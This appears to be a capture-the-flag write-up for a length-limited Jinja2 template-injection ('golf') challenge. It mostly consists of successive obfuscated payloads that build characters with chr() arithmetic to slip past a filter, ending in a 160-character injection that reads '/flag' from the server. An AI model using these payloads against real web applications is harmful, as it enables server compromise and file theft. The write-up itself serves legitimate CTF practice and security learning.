# SSTI

GOLF: https://github.com/redpwn/rctf-golf

https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti\

## Restriction

- no `%` -> mean no statement

## Getting Closer

- `"chr(61)"|e` -> `=`
- `"chr(64)"|e` -> `@`
- `+` need to escape as `%2B`
- Support `+`, `-`, `*`
  - `"chr(6*4*4-1)"|e` Got `_` (95 in ascii)
  - `"chr(46)"|e` Got `.` (46 in ascii)
  - `"chr(6*4*4%2B1)"|e` for `a`
  - `"chr(6*6*4-6*4-4-1)"|e` for `s`
  - `"chr(6*4%2B6%2B4)"|e` for `"`
  - `"chr(6*4*4%2B6%2B6%2B1)"|e` for `m`
  - `"chr(6*6*4-6*4-4-1)"|e` for `s`
  - `"chr(6*4*4%2B6%2B6%2B4-1)"` for `o`
  - `"chr(6*4*4%2B6*(4-1)-1)"|e` for `q`
  - `"chr(6*4*4%2B(4%2B1)*4)"|e` for `t`
  - `"chr(ord('o')%2B1)"|e` for `p`
  - `"chr(ord('o')-1)"|e` for `n`
  - `"chr(ord('h')-1)"|e` for `g`
  - `"chr(6*6%2B4%2B4)"|e` for `,`
  - `"chr(ord('h')-1-1)"|e` for `f`
  - 61 -> =, 66 -> B

## First Try Payload

```txt
chr(6*4*4-1)%2Bchr(6*4*4-1) -> "__"
```

```txt
{{"

# "".__class__
chr(6*4%2B6%2B4)%2Bchr(6*4%2B6%2B4)%2Bchr(46)%2Bchr(6*4*4-1)%2Bchr(6*4*4-1)%2B'cl'%2Bchr(6*4*4%2B1)%2Bchr(6*6*4-6*4-4-1)%2Bchr(6*6*4-6*4-4-1)%2Bchr(6*4*4-1)%2Bchr(6*4*4-1)

# .__mro__

%2Bchr(46)%2Bchr(6*4*4-1)%2Bchr(6*4*4-1)%2Bchr(6*4*4%2B6%2B6%2B1)%2B'ro'%2Bchr(6*4*4-1)%2Bchr(6*4*4-1)

"|e|e}}
```

```txt
{{"chr(6*4%2B6%2B4)%2Bchr(6*4%2B6%2B4)%2Bchr(46)%2Bchr(6*4*4-1)%2Bchr(6*4*4-1)%2B'cl'%2Bchr(6*4*4%2B1)%2Bchr(6*6*4-6*4-4-1)%2Bchr(6*6*4-6*4-4-1)%2Bchr(6*4*4-1)%2Bchr(6*4*4-1)%2Bchr(46)%2Bchr(6*4*4-1)%2Bchr(6*4*4-1)%2Bchr(6*4*4%2B6%2B6%2B1)%2B'ro'%2Bchr(6*4*4-1)%2Bchr(6*4*4-1)"|e|e}}
```

Out of limit 161

## Second Try

Try Request

```txt
# request
{{"
're'%2Bchr(6*4*4%2B6*(4-1)-1)%2B'ue'%2Bchr(6*6*4-6*4-4-1)%2Bchr(6*4*4%2B(4%2B1)*4)
"|e|e}}
```

```txt
{{"'re'%2Bchr(6*4*4%2B6*(4-1)-1)%2B'ue'%2Bchr(6*6*4-6*4-4-1)%2Bchr(6*4*4%2B(4%2B1)*4)"|e|e}}
```

Eval Failed: name 'request' is not defined
Not in Context ??

## Third Try

```txt
# ''+open('/flag','r').read()

{{"%27%27%2Bopen(%27/flag%27,%27r%27).read()"|e}}
```

```txt
# ''+open('/flag').read()

{{"
chr(46-6-1)%2Bchr(46-6-1)%2B
'%2B'%2B
'o'%2B
chr(ord('o')%2B1)%2B
'e'%2B
chr(ord('o')-1)%2B
'('%2B
chr(46-6-1)%2B
chr(46%2B1)%2B
chr(6*4*4%2B6)%2B
'l'%2B
chr(6*4*4%2B1)%2B
chr(ord('h')-1)%2B
chr(46-6-1)%2B
')'%2B
chr(46)%2B
're'%2B
chr(6*4*4%2B1)%2B
'd'%2B
'()'
"|e|e}}
```

```txt
{{"chr(46-6-1)%2Bchr(46-6-1)%2B'%2B'%2B'o'%2Bchr(ord('o')%2B1)%2B'e'%2Bchr(ord('o')-1)%2B'('%2Bchr(46-6-1)%2Bchr(46%2B1)%2Bchr(6*4*4%2B6)%2B'l'%2Bchr(6*4*4%2B1)%2Bchr(ord('h')-1)%2Bchr(46-6-1)%2B')'%2Bchr(46)%2B're'%2Bchr(6*4*4%2B1)%2B'd'%2B'()'"|e|e}}
```

to 205

## Final Pls Try

```txt
# (open('/flag').read())

{{(
'(o'%2B
(6*4*4%2B4*4)|ch%2B
'e'%2B
(66%2B6%2B6)|ch|l%2B
'('%2B
(44-4-1)|ch%2B
(46%2B1)|ch%2B
(66%2B4)|ch|l%2B
'l'%2B
(66-1)|ch|l%2B
(6*4*4%2B6%2B1)|ch%2B
(44-4-1)|ch%2B
')'%2B
46|ch%2B
're'%2B
(66-1)|ch|l%2B
'd())'
)|e}}
```

```txt
{{('(o'%2B(6*4*4%2B4*4)|ch%2B'e'%2B(66%2B6%2B6)|ch|l%2B'('%2B(44-4-1)|ch%2B(46%2B1)|ch%2B(66%2B4)|ch|l%2B'l'%2B(66-1)|ch|l%2B(6*4*4%2B6%2B1)|ch%2B(44-4-1)|ch%2B')'%2B46|ch%2B're'%2B(66-1)|ch|l%2B'd())')|e}}
```

with length: 160
